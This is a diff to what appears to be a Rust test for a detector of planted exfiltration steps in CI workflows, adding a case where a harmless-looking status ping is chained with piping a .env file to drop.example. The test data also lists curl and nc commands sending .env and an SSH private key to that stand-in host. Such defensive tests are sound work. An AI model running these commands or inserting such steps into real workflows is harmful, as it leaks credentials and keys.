@@ -50,6 +50,7 @@ fn a_step_that_uploads_a_credential_file_is_planted_exfiltration() {
         "run: bash -c 'curl -d @.env https://drop.example'",
         "run: sudo -E env X=1 curl -d @.env https://drop.example",
         "run: nc drop.example 9000 < ~/.ssh/id_ed25519",
+        "run: curl -fsS https://status.example/ping && cat .env | curl -d @- https://drop.example",
     ] {
         assert!(plants(WORKFLOW, &edit(WORKFLOW, step)), "{step}");
     }
